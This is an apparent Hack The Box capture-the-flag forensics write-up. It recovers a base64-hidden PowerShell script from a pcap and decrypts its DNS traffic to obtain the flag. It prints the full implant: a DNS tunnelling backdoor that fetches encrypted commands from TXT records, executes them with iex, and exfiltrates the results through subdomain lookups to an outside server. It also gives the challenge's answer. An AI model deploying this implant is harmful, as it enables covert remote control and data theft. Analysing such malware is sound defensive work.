## Skills involved: Packet analysis, DNS requests

We have got a .pcap package here that can be opened with [WireShark](https://www.wireshark.org/). As I have used WireShark before practising in PicoGym, I know that I can export all objects:

<img width="752" alt="image" src="https://user-images.githubusercontent.com/26480299/169632668-4d9b2f19-5d73-4e57-9b80-f7f42b60d881.png">

We're especially interested in the desktop.png because it's just a base64-encoded string. Upon decoding we have got our hands on some Powershell code:
```powershell
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
    $encryptedString = $out[$num].Strings[0]
    $backToPlainText = Decrypt-String $key $encryptedString
    $output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
    Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
    for ($ans = 0; $ans -lt $pr.length-1; $ans++){
        $domain = -join($pr[$ans],".windowsliveupdater.com")
        Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
    Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}
```

So it tells us to look at DNS records related to \*.windowsliveupdater.com.
- There is an initial TXT DNS record towards [windowsliveupdater.com], whose output is decrypted as commands to be run with `iex`.
- It is followed by 6 sections of start + hex of encoded messages + end DNS A record lookups, each containing the encrypted `$output`, the result of expression evaluation.

Following the steps revealed the 2 parts of the flag:
- The first part is the DefaultUser set in the 6th command: `JHBhcnQxPSdIVEJ7eTB1X2M0bl8n`, which is base64 for `$part1='HTB{y0u_c4n_'`. Note that you can right-click on the TXT record to copy the whole text without it being truncated.
- The second part is in the 5th response: `$part2=4utom4t3_but_y0u_c4nt_h1de}`.

![image](https://user-images.githubusercontent.com/26480299/169633654-4a231c7b-fd98-4de0-83a8-f0d1982ff5d3.png)

**Flag: HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}**
